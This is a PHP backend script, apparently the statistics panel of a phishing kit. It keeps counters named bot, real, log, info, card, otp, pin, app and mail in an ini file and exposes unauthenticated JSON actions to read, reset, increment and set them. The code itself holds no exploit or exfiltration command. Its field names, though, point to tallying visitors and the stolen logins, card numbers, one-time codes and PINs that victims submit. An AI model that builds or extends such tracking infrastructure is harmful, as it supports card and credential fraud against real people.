<?php
declare(strict_types=1);

require_once "../../cors.php";
require_once '../func.php';

/**
 * Configuration
 */
const STATS_FILE = './stats.ini';
const BACKUP_DIR = './backups/';

/**
 * Security headers
 */
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('Content-Type: application/json');

/**
 * Default stats structure
 */
const DEFAULT_STATS = [
    'totale' => 0,
    'bot' => 0,
    'real' => 0,
    'log' => 0,
    'info' => 0,
    'card' => 0,
    'otp' => 0,
    'pin' => 0,
    'app' => 0,
    'mail' => 0,
];

/**
 * Initialize backup directory
 */
function init_stats_backup_dir(): void {
    if (!is_dir(BACKUP_DIR)) {
        mkdir(BACKUP_DIR, 0755, true);
    }
}

/**
 * Backup stats file before reset
 */
function backup_stats(): bool {
    try {
        init_stats_backup_dir();
        
        if (!file_exists(STATS_FILE)) {
            return false;
        }
        
        $backup_file = BACKUP_DIR . 'stats_' . date('Y-m-d_H-i-s') . '.ini';
        return copy(STATS_FILE, $backup_file);
    } catch (Exception $e) {
        error_log("Backup stats error: " . $e->getMessage());
        return false;
    }
}

/**
 * Clean old backup files (keep last 20)
 */
function clean_old_stats_backups(int $keep = 20): void {
    if (!is_dir(BACKUP_DIR)) {
        return;
    }
    
    $files = glob(BACKUP_DIR . 'stats_*.ini');
    if (count($files) <= $keep) {
        return;
    }
    
    // Sort by date (newest first)
    usort($files, function($a, $b) {
        return filemtime($b) - filemtime($a);
    });
    
    // Remove old files
    for ($i = $keep; $i < count($files); $i++) {
        unlink($files[$i]);
    }
}

/**
 * Read current stats
 */
function read_stats(): array {
    if (!file_exists(STATS_FILE)) {
        return DEFAULT_STATS;
    }
    
    $stats = parse_ini_file(STATS_FILE);
    if ($stats === false) {
        error_log("Failed to parse stats file");
        return DEFAULT_STATS;
    }
    
    // Merge with defaults to ensure all keys exist
    return array_merge(DEFAULT_STATS, $stats);
}

/**
 * Write stats to file
 */
function write_stats(array $stats): bool {
    return update_ini($stats, STATS_FILE);
}

/**
 * Reset all stats to zero
 */
function reset_all_stats(): array {
    try {
        // Backup before reset
        $backup_success = backup_stats();
        clean_old_stats_backups();
        
        // Reset to default
        $success = write_stats(DEFAULT_STATS);
        
        if (!$success) {
            throw new Exception("Failed to write stats file");
        }
        
        return [
            'success' => true,
            'message' => 'All stats reset successfully',
            'backup_created' => $backup_success,
            'stats' => DEFAULT_STATS
        ];
    } catch (Exception $e) {
        error_log("Error resetting stats: " . $e->getMessage());
        return [
            'success' => false,
            'error' => $e->getMessage()
        ];
    }
}

/**
 * Reset specific stats fields
 */
function reset_specific_stats(array $fields): array {
    try {
        if (empty($fields)) {
            throw new Exception("No fields specified");
        }
        
        // Read current stats
        $stats = read_stats();
        
        // Backup before reset
        $backup_success = backup_stats();
        clean_old_stats_backups();
        
        // Reset only specified fields
        $reset_fields = [];
        foreach ($fields as $field) {
            if (array_key_exists($field, DEFAULT_STATS)) {
                $stats[$field] = 0;
                $reset_fields[] = $field;
            }
        }
        
        if (empty($reset_fields)) {
            throw new Exception("No valid fields to reset");
        }
        
        // Write updated stats
        $success = write_stats($stats);
        
        if (!$success) {
            throw new Exception("Failed to write stats file");
        }
        
        return [
            'success' => true,
            'message' => 'Stats reset successfully',
            'reset_fields' => $reset_fields,
            'backup_created' => $backup_success,
            'stats' => $stats
        ];
    } catch (Exception $e) {
        error_log("Error resetting specific stats: " . $e->getMessage());
        return [
            'success' => false,
            'error' => $e->getMessage()
        ];
    }
}

/**
 * Get current stats (for GET requests)
 */
function get_current_stats(): array {
    return [
        'success' => true,
        'stats' => read_stats()
    ];
}

/**
 * Increment a specific stat
 */
function increment_stat(string $field, int $amount = 1): array {
    try {
        if (!array_key_exists($field, DEFAULT_STATS)) {
            throw new Exception("Invalid field: $field");
        }
        
        $stats = read_stats();
        $stats[$field] = ($stats[$field] ?? 0) + $amount;
        
        $success = write_stats($stats);
        
        if (!$success) {
            throw new Exception("Failed to write stats");
        }
        
        return [
            'success' => true,
            'message' => "Incremented $field by $amount",
            'stats' => $stats
        ];
    } catch (Exception $e) {
        error_log("Error incrementing stat: " . $e->getMessage());
        return [
            'success' => false,
            'error' => $e->getMessage()
        ];
    }
}

/**
 * Set a specific stat value
 */
function set_stat(string $field, int $value): array {
    try {
        if (!array_key_exists($field, DEFAULT_STATS)) {
            throw new Exception("Invalid field: $field");
        }
        
        if ($value < 0) {
            throw new Exception("Value cannot be negative");
        }
        
        $stats = read_stats();
        $stats[$field] = $value;
        
        $success = write_stats($stats);
        
        if (!$success) {
            throw new Exception("Failed to write stats");
        }
        
        return [
            'success' => true,
            'message' => "Set $field to $value",
            'stats' => $stats
        ];
    } catch (Exception $e) {
        error_log("Error setting stat: " . $e->getMessage());
        return [
            'success' => false,
            'error' => $e->getMessage()
        ];
    }
}

/**
 * Main request handler
 */
function handle_request(): void {
    $method = $_SERVER['REQUEST_METHOD'];
    
    // GET: Récupérer les stats
    if ($method === 'GET') {
        $response = get_current_stats();
        echo json_encode($response);
        exit();
    }
    
    // POST: Actions sur les stats
    if ($method === 'POST') {
        $input = file_get_contents('php://input');
        $data = json_decode($input, true);
        
        // Si pas de JSON, utiliser POST normal
        if ($data === null) {
            $data = $_POST;
        }
        
        $action = $data['action'] ?? 'reset_all';
        
        switch ($action) {
            case 'reset_all':
                $response = reset_all_stats();
                break;
                
            case 'reset_specific':
                $fields = $data['fields'] ?? [];
                $response = reset_specific_stats($fields);
                break;
                
            case 'increment':
                $field = $data['field'] ?? '';
                $amount = (int)($data['amount'] ?? 1);
                $response = increment_stat($field, $amount);
                break;
                
            case 'set':
                $field = $data['field'] ?? '';
                $value = (int)($data['value'] ?? 0);
                $response = set_stat($field, $value);
                break;
                
            default:
                $response = [
                    'success' => false,
                    'error' => 'Invalid action'
                ];
        }
        
        echo json_encode($response);
        exit();
    }
    
    // Méthode non supportée
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit();
}

// Execute main handler
handle_request();